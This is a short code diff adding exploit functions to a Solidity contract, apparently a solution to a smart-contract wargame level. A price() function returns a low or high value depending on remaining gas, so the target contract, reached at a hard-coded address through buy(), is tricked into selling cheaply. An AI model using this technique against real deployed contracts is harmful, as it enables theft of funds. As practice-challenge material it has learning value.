@@ -132,6 +132,22 @@ contract Building {
       owner = 0x28E0E8d05a4c133a8B22210634Cd2CfA012d1b15;
   }
 
+
+  function price() public view returns (uint) {
+    if (gasleft() < 6700)
+      return 1;
+    else
+      return 101;
+  }
+
+
+  function buy() public {
+      address addr = 0xD2DdE4E5c25BFFEA5Dc262F817828a3Ab3d406fB;
+      address payable addrP = payable(addr);
+      (bool result, ) = addrP.call{gas: 30000}(abi.encodeWithSignature("buy()"));
+      require(result);
+  }
+
   // to support receiving ETH by default
   receive() external payable {
     //revert("youcan't"); for king
